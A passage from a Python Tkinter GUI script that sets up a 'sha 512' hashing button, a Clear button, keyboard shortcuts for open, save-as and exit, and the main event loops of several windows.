bt5=Button(fm2,text='sha 512',bg='Gray',bd=11,fg='white',activebackground='red'
           ,font=('arial',11),command=sha512)
bt5.place(x=110,y=170)
btclear=Button(fm2,text='Clear',bg='Gray',bd=11,fg='white',activebackground='red'
               ,font=('arial',11),command=clear)
btclear.place(x=300,y=300)











#=========================================================================================================================#
root.bind('<Control-o>',Control_Open)
root.bind('<Control-s>',Cotrol_S_Saveas)
root.configure(menu=menubar)
root.bind('<Alt-F4>',Exit_2_Keyboard)
root.mainloop()
root2.mainloop()
root3.mainloop()
root4.mainloop()
#==========================================================================================================================#
